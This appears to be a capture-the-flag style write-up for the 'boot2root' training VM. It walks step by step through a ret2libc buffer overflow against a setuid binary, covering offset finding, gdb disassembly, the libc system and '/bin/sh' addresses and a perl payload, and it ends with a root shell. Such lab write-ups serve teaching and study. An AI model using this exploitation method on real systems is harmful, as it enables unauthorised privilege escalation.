# boot2root
root a iso using multiple vulnerabilities 


## Get IP running VirtualBox machine (boot2root)

```
VBoxManage guestproperty get boot2root "/VirtualBox/GuestInfo/Net/0/V4/IP"
```

## ZAZ user

#### find char numbers to overwrite the EIP

```
./exploit_me `printf 'A%.0s' {1..140}`
```
```
zaz@BornToSecHackMe:~$ ./exploit_me `printf 'A%.0s' {1..140}`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Illegal instruction (core dumped)
```

#### gdb break at strcpy in main

```
gdb exploit_me
(gdb) disass main
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   %ebp
   0x080483f5 <+1>:	mov    %esp,%ebp
   0x080483f7 <+3>:	and    $0xfffffff0,%esp
   0x080483fa <+6>:	sub    $0x90,%esp
   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    $0x1,%eax
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    0xc(%ebp),%eax
   0x08048410 <+28>:	add    $0x4,%eax
   0x08048413 <+31>:	mov    (%eax),%eax
   0x08048415 <+33>:	mov    %eax,0x4(%esp)
   0x08048419 <+37>:	lea    0x10(%esp),%eax
   0x0804841d <+41>:	mov    %eax,(%esp)
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    0x10(%esp),%eax
   0x08048429 <+53>:	mov    %eax,(%esp)
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    $0x0,%eax
   0x08048436 <+66>:	leave
   0x08048437 <+67>:	ret
End of assembler dump.
(gdb) b *0x08048420
Breakpoint 1 at 0x8048420
(gdb) r
```

#### Find EIP address

```
(gdb) r $(perl -e 'print "A"x140 . "\xef\xbe\xad\xde"')
Starting program: /home/zaz/exploit_me $(perl -e 'print "A"x140 . "\xef\xbe\xad\xde"')

Breakpoint 1, 0x08048420 in main ()
```

#### Find system function address

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

#### Find chars "/bin/sh"

```
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
(gdb) x/s 0xb7f8cc58
0xb7f8cc58:	 "/bin/sh"
```

#### Prepare ret2libc attack

```
perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"'
```

#### Execute

```
./exploit_me $(perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"')

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��OSEFX��
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)

```

We are now root

![shellcode](https://github.com/42aroger/boot2root/blob/master/img/rooted.png?raw=true)
